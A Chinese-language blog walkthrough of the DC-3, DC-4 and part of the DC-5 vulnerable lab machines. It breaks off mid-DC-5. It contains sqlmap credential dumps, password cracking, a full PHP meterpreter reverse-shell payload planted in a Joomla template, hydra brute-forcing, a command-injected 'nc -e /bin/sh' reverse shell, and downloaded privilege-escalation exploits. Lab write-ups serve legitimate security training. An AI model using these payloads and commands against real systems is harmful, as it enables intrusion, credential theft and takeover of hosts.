<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@DC-2:/home/tom<span class="comment"># cd ~</span></span><br><span class="line">root@DC-2:~<span class="comment"># ls</span></span><br><span class="line">final-flag.txt</span><br><span class="line">root@DC-2:~<span class="comment"># cat final-flag.txt </span></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">&#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulatons!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A special thanks to all those who sent me tweets</span></span><br><span class="line"><span class="string">and provided me with feedback - it&#x27;</span>s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220912211352919.png" alt="image-20220912211352919"></p>
<p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权</a></p>
<h3 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h3><p>攻击机Kali ： </p>
<blockquote>
<p>IP地址：192.168.245.132</p>
</blockquote>
<p>靶机 ：</p>
<blockquote>
<p>IP地址：192.168.245.133</p>
</blockquote>
<p>刚开始的DC-3靶机即使换了NAT网络还是用不了的，无法检测到DC-3的ip，我们得去救援模式将网络修好</p>
<p>首先，开启DC-3靶机，然后疯狂按e</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-29-01.png" alt="Snipaste_2022-09-26_09-29-01"></p>
<p>找到下面ro这个地方，将ro替换成为rw signie init&#x3D;&#x2F;bin&#x2F;bash</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-30-32.png" alt="Snipaste_2022-09-26_09-30-32"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-31-22.png" alt="Snipaste_2022-09-26_09-31-22"></p>
<p>然后按ctrl+x，重启服务进入如下界面，如果并没进入此界面表示你上面修改错误，重启电脑再次进行修改</p>
<p>查看一下ip，发现ip是没有的</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-31-52.png" alt="Snipaste_2022-09-26_09-31-52"></p>
<p>我们修改一下网卡配置文件</p>
<p>编辑&#x2F;etc&#x2F;network&#x2F;interfaces将配置改成下面，保存退出</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-33-14.png" alt="Snipaste_2022-09-26_09-33-14"></p>
<p>使用dhclient命令重新获取IP，然后我们就得到了ip(垃圾话)</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926105814524.png" alt="image-20220926105814524"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/Snipaste_2022-09-26_09-34-51.png" alt="Snipaste_2022-09-26_09-34-51"></p>
<p>老规矩，扫描本地ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926094926539.png" alt="image-20220926094926539"></p>
<p>扫描端口和服务</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926110309888.png" alt="image-20220926110309888"></p>
<p>仅开放了80端口</p>
<p>同时发现了 Joomla! - Open Source Content Managemen</p>
<p>浏览器看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220926112717159.png" alt="image-20220926112717159"></p>
<p>使用 joomscan 专用扫描器，来获取更详细的信息</p>
<p>Kali 2022.1 版默认没有 joomscan 专用扫描器，需要安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rezasp/joomscan.git</span><br><span class="line"><span class="built_in">cd</span> joomscan</span><br><span class="line">perl joomscan.pl</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl joomscan.pl -u http://192.168.245.133/</span><br></pre></td></tr></table></figure>

<p>知道了版本</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927084538386.png" alt="image-20220927084538386"></p>
<p>通过 searchsploit 查看是否有可以用的 EXP</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927084928582.png" alt="image-20220927084928582"></p>
<p>可以看到有些 SQL 注入漏洞的文本，可以看一下</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927085248969.png" alt="image-20220927085248969"></p>
<p>按照提示，我们就用 sqlmap 跑一下吧</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927085809795.png" alt="image-20220927085809795"></p>
<p>爆出所有数据库</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927090425935.png" alt="image-20220927090425935"></p>
<p>利用 joomladb 数据库，爆数据表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.245.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -tables -p list[fullordering] </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927094821498.png" alt="image-20220927094821498"></p>
<p>利用#_users 数据表，查字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.245.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="string">&quot;joomladb&quot;</span> -T <span class="string">&quot;#__users&quot;</span> --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927173035684.png" alt="image-20220927173035684"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927173226658.png" alt="image-20220927173226658"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap  -u <span class="string">&quot;http://192.168.245.133/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D <span class="string">&quot;joomladb&quot;</span> -T <span class="string">&quot;#__users&quot;</span> -C <span class="string">&quot;name,password&quot;</span> --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>导出#_users 数据表里所有数据</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927173427864.png" alt="image-20220927173427864"></p>
<p>获得网站后台登录用户名admin和密码hash值：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">admin  <span class="comment">#用户名</span></span><br><span class="line">$2<span class="keyword">y</span>$1<span class="number">0</span>$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu  <span class="comment">#密码hash值</span></span><br></pre></td></tr></table></figure>

<p>创建一个DC-3password.txt，然后写入password</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927174316180.png" alt="image-20220927174316180"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john DC-3password.txt --show</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927175456943.png" alt="image-20220927175456943"></p>
<p>利用通过 Joomscan 扫出的几个目录，就包含管理员登录界面</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927195503974.png" alt="image-20220927195503974"></p>
<p>我们尝试进入一下后台页面</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927201025787.png" alt="image-20220927201025787"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.245.133/administrator/</span><br><span class="line">admin</span><br><span class="line">snoopy</span><br></pre></td></tr></table></figure>

<p>上传webshell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220927201209616.png" alt="image-20220927201209616"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153800067.png" alt="image-20220928153800067"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153852429.png" alt="image-20220928153852429"></p>
<p>创建名字是test的php文件</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153918438.png" alt="image-20220928153918438"></p>
<p>首先我们来到kali生成一个反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.245.132 lport=7777 -o test.php</span><br></pre></td></tr></table></figure>

<p>把这个贴到网站刚刚创建好的php文件里面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php /**/ error_reporting(0); <span class="variable">$ip</span> = <span class="string">&#x27;192.168.245.132&#x27;</span>; <span class="variable">$port</span> = 7777; <span class="keyword">if</span> ((<span class="variable">$f</span> = &#x27;stream_socket_client&#x27;) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="string">&quot;tcp://&#123;<span class="variable">$ip</span>&#125;:&#123;<span class="variable">$port</span>&#125;&quot;</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;fsockopen&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;socket_create&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span class="variable">$res</span> = @socket_connect(<span class="variable">$s</span>, <span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; die(); &#125; <span class="variable">$s_type</span> = <span class="string">&#x27;socket&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s_type</span>) &#123; die(<span class="string">&#x27;no socket funcs&#x27;</span>); &#125; <span class="keyword">if</span> (!<span class="variable">$s</span>) &#123; die(<span class="string">&#x27;no socket&#x27;</span>); &#125; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$len</span> = fread(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$len</span> = socket_read(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; die(); &#125; <span class="variable">$a</span> = unpack(<span class="string">&quot;Nlen&quot;</span>, <span class="variable">$len</span>); <span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">&#x27;len&#x27;</span>]; <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>; <span class="keyword">while</span> (strlen(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$b</span> .= fread(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$b</span> .= socket_read(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; &#125; &#125; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock&#x27;</span>] = <span class="variable">$s</span>; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock_type&#x27;</span>] = <span class="variable">$s_type</span>; <span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; ini_get(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123; <span class="variable">$suhosin_bypass</span>=create_function(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); <span class="variable">$suhosin_bypass</span>(); &#125; <span class="keyword">else</span> &#123; <span class="built_in">eval</span>(<span class="variable">$b</span>); &#125; die();</span><br></pre></td></tr></table></figure>

<p>然后点击左上角save</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928150452342.png" alt="image-20220928150452342"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我们建立kali的监听</span></span><br><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole                                                                           </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 &gt; use exploit/multi/handler </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; show options </span></span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lhost 192.168.245.132</span></span><br><span class="line">lhost =&gt; 192.168.245.132</span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lport 7777</span></span><br><span class="line">lport =&gt; 7777</span><br><span class="line"><span class="comment">#msf6 exploit(multi/handler) &gt; exploit </span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154521471.png" alt="image-20220928154521471"></p>
<p>然后访问一下下面这个地址激活反弹脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.245.133/templates/protostar/test.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928153730034.png" alt="image-20220928153730034"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154450275.png" alt="image-20220928154450275"></p>
<p>ls看一眼文件内容</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154850666.png" alt="image-20220928154850666"></p>
<p>看看sysinfo</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928154928576.png" alt="image-20220928154928576"></p>
<p>输入shell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928155138240.png" alt="image-20220928155138240"></p>
<p>whoami看看账号</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928155448680.png" alt="image-20220928155448680"></p>
<p>先弄个交互的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-3:/var/www/html/templates/protostar$ </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928160431041.png" alt="image-20220928160431041"></p>
<p>我们可以通过whoami知道现在的用户是web的用户，我们的权限太低了，得想办法提权，我们在前面知道这个ubuntu的系统非常老了，版本在16.04</p>
<p>在msfconsole里面输入searchsploit 16.04 ubuntu</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928161501777.png" alt="image-20220928161501777"></p>
<p>下载脚本到kali</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/julintongxue/julintianxia/blob/main/39772.zip</span><br></pre></td></tr></table></figure>

<p>上传脚本到靶机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload /root/39772.zip /tmp/39772.zip</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220928232817068.png" alt="image-20220928232817068"></p>
<p>解压之后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-3:/tmp$ <span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">compile.sh  doubleput.c  hello	  suidhelper</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./compile.sh</span><br><span class="line"></span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">compile.sh  doubleput.c  hello	  suidhelper</span><br><span class="line">doubleput   fuse_mount	 hello.c  suidhelper.c</span><br><span class="line">www-data@DC-3:/tmp/ebpf_mapfd_doubleput_exploit$ ./doubleput</span><br><span class="line">./doubleput</span><br><span class="line"></span><br><span class="line">root@DC-3:/tmp/ebpf_mapfd_doubleput_exploit<span class="comment"># </span></span><br><span class="line"><span class="comment">#可以看到符号已经变成#号了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#whoami确认一下</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220929004537682.png" alt="image-20220929004537682"></p>
<p>回到root目录</p>
<p>找到flag</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220929004654873.png" alt="image-20220929004654873"></p>
<p>在此，DC-3结束</p>
<h3 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h3><p>开启DC3，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan 192.168.245.0/24</span><br></pre></td></tr></table></figure>

<p>发现一个可疑ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091158975.png" alt="image-20221031091158975"></p>
<p>我们进行更加精确的二次扫描，这次我们使用nmap来探测其开放的端口和服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -O 192.168.245.147</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091340103.png" alt="image-20221031091340103"></p>
<p>我们可以看到目标靶机开放了80端口的web服务，那么我们在浏览器看看这是什么网站。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091505621.png" alt="image-20221031091505621"></p>
<p><strong>web指纹识别</strong></p>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whatweb -v 192.168.245.147</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031091918457.png" alt="image-20221031091918457"></p>
<p>可知网站是nginx中间件搭建</p>
<p>已知用户名为 admin，但不知密码，用 hydra 爆破一下</p>
<p>首先解压密码包</p>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<p>爆破密码命令： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L 用户名字典 -P 密码字典 -o DC4.pass -vV -t 5 -f 192.168.15.152 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -o DC4.pass -vV -t 5 -f 192.168.245.147 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>直接账号密码爆破这类默认账号一般是admin 可以尝试下</li>
<li>-L  — 用户字典</li>
<li>-l 直接写用户名</li>
<li>-o — 输出的文件名。爆破成功的话里面会放得到的密码。</li>
<li>-f — 得到了一组用户名和密码就停止爆破。</li>
<li>http-post-form — post表单提交的数据。</li>
<li>&#x2F;login.php — 请求的目录。</li>
<li>username&#x3D;^USER^&amp;password&#x3D;^PASS^ — 攻击载荷。</li>
<li>S&#x3D;logout — 密码正确时返回的应用关键字符串。<br>S&#x3D;logout是因为一般登录成功之后返回的关键字符串中都有logout</li>
</ul>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031094803663.png" alt="image-20221031094803663"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031094748346.png" alt="image-20221031094748346"></p>
<p>得到账号：admin 密码：happy</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031094911812.png" alt="image-20221031094911812"></p>
<p>成功登录界面</p>
<p>点击command</p>
<p>点RUN 发现好像是命令执行了 ls -l 抓包看看</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095351381.png" alt="image-20221031095351381"></p>
<p>果然，是通过关键字 <code>radio</code>提交命令的 我们加个<code>ip add</code>命令试试</p>
<p>记得空格要加+号！！</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ip</span> <span class="keyword">add</span>  		#<span class="built_in">ip</span>+<span class="keyword">add</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095504601.png" alt="image-20221031095504601"></p>
<p>nice,直接返回ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095530729.png" alt="image-20221031095530729"></p>
<p>**反弹shel ** </p>
<p>尝试用nc看看可不可以反弹</p>
<p>kali上先开启侦听8080端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>在bp写入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.245.132 8080</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095820381.png" alt="image-20221031095820381"></p>
<p>kali马上接受到反弹的shell</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031095841109.png" alt="image-20221031095841109"></p>
<p>使用python获得交互式界面,在kali输入命令：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100012727.png" alt="image-20221031100012727"></p>
<p>看看具有SUID权限的命令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100428920.png" alt="image-20221031100428920"></p>
<p>查看查看exim4版本</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">exim4 --<span class="keyword">version</span>		<span class="comment">#查看exim4的版本</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100458599.png" alt="image-20221031100458599"></p>
<p>版本是4.89,爷笑哭了</p>
<p>先看看本地漏洞库</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchsploit</span> exim <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031100620731.png" alt="image-20221031100620731"></p>
<p>46996符合exim 4.89 就用这个 拷贝到kali的apache web页面下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start apache2.service  									<span class="comment">#开启apache</span></span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html <span class="comment">#拷贝到kali的apache web</span></span><br></pre></td></tr></table></figure>

<p>DC4:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.245.132/46996.sh</span><br><span class="line"><span class="built_in">chmod</span> +x 46996.sh</span><br><span class="line">./46996.sh</span><br><span class="line"><span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031101218731.png" alt="image-20221031101218731"></p>
<p>提权成功</p>
<p>夺取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221031101508925.png" alt="image-20221031101508925"></p>
<h3 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h3><p>开启DC5，我们先用kali进行一次arp的内网扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan 192.168.245.0/24</span><br></pre></td></tr></table></figure>

<p>发现一个可疑ip</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024113754330-1667183983059.png" alt="image-20221024113754330"></p>
<p>我们进行更加精确的二次扫描，这次我们使用nmap来探测其开放的端口和服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -T4 -O 192.168.245.144</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024113841827-1667183983057.png" alt="image-20221024113841827"></p>
<p>我们可以看到目标靶机开放了80端口的web服务，那么我们在浏览器看看这是什么网站。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024113931244-1667183983059.png" alt="image-20221024113931244"></p>
<p>额。。。出现一个很陌生端web端，我们扫描一下这个网站的目录，这需要用dirsearch</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.245.144/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024133116101-1667183983059.png" alt="image-20221024133116101"></p>
<p>找到了很多目录，发现<code>thankyou.php</code>这个目录刷新之后页面的版权时间每次都在变，从<code>2017-2020</code>随机改变。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024133243518-1667183983060.png" alt="image-20221024133243518"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024133302027-1667183983060.png" alt="image-20221024133302027"></p>
<p>然后在<code>footer.php</code>这个目录下找到了版权时间的路径，而且也是刷新之后从<code>2017-2020</code>随机改变。</p>
<p>然后我们检测一下网站架构，发现是由<code>nginx</code>搭建的。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20221024145539433-1667183983060.png" alt="image-20221024145539433"></p>
<p>根据url特征，很有可能能存在文件包含漏洞，既然可能存在 文件包含漏洞 ,现在需要知道<code> thankyou.php</code> 是如何把 <code>footer.php </code>包含的</p>
<p>wfuzz 模糊测试：</p>
<p>1.目录扫描</p>
<p>2.找参数    <code>192.168.245.144/?=value</code>    它能替换<code>？</code>找到对应参数</p>
<p>3.密码爆破   username password</p>
<p>4.找sql xss</p>
<p>5.压力测试</p>
<p>这个网址是留给我们的提示，我们可以使用wfuzz来找到网页的参数</p>
